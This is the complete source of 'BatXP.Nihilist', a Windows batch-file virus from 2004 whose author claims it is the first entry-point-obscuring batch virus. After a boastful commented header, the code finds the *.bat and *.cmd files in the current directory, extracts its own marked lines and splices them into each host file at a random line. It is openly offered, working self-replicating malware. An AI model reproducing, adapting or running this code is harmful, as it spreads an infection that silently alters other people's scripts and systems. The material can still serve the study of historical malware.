%  BatXP.Nihilist
%  by Second Part To Hell[rRlf]
%  www.spth.de.vu
%  spth@priest.com
%  written in March 2004
%  in Austria
%
%  BatXP.Nihilist is the very first Entry Point Obscuring (EPO) Batch virus
%  ever done. EPO was the last very important and not yet done technique until
%  March 2004. And as you may imagine, it's done now. :).
%
%  I got the idea in writing it long time before, because I thought that every
%  language should have at least one encrypted, one polymorph and one EPO virus.
%  But unfortunatly I forgot the idea, and just picked it up again in 2004, when
%  I read DvL's editional of Batch Zone#4. Much thanks! :)
%
%  The code uses some interesting commands, and it's doubtful that you will understand
%  the whole thing without testing the commands or read Microsoft's help (command /?) :D.
%
%  That's more or less everything I want to say. I don't want to explain everything because
%  everybody who is interested in that will understand it. If not, just send me a mail!
%
%  The History of the name is little strange: I asked my girlfriend if she knows any cool
%  word. She sent me a SMS: 'Nihilist'. Well, First I wanted to use it for my PE vir, then
%  for my MenuetOS vir, but both aren't finished so far and I want to use this name for a
%  virus :). Much thanks for the cool name, ILD!
%
%
%--------------------------------------------<([{  BatXP.Nihilist  }])>--------------------------------------------
%Nihilist%@echo off
%Nihilist%set num=0
:ag	%Nihilist%
%Nihilist%set fn%num%=
%Nihilist%set /a num+=1
%Nihilist%if %num% LSS 5 goto ag
%Nihilist%set num=0
%Nihilist%for %%a in (*.bat *.cmd) do call :mr %%a
%Nihilist%set num=-1
:fi	%Nihilist%
%Nihilist%set /a num+=1
%Nihilist%if %num% GTR 5 (goto ROF)
%Nihilist%if %num% EQU 0 (set file=%fn0%)
%Nihilist%if %num% EQU 1 (set file=%fn1%)
%Nihilist%if %num% EQU 2 (set file=%fn2%)
%Nihilist%if %num% EQU 3 (set file=%fn3%)
%Nihilist%if %num% EQU 4 (set file=%fn4%)
%Nihilist%if %num% EQU 5 (set file=%fn5%)
%Nihilist%set rnd=%random%
%Nihilist%set spth=%0
:findnum	%Nihilist%
%Nihilist%set /a rnd-=10
%Nihilist%if %rnd% GEQ 10 (goto findnum)
%Nihilist%set lz=0
%Nihilist%del tmp
%Nihilist%for /f "tokens=1*" %%a in (%file%) do if 1 EQU 1 (
%Nihilist%  set lc=%%a %%b
%Nihilist%  call :wl
%Nihilist%)
find "Nihilist" <%spth% >>tmp
%Nihilist%more +%rnd% < %file% >>tmp
%Nihilist%move /y tmp %file%
%Nihilist%@echo on
%Nihilist%goto fi
:wl	%Nihilist%
%Nihilist%set /a lz=%lz%+1
%Nihilist%if %lz% LEQ %rnd% (echo %lc% >>tmp)
%Nihilist%goto :EOF
:mr	%Nihilist%
%Nihilist%if %num% LEQ 5 (
%Nihilist%set fn%num%=%1
%Nihilist%set /a num+=1
%Nihilist%)
:ROF	%Nihilist%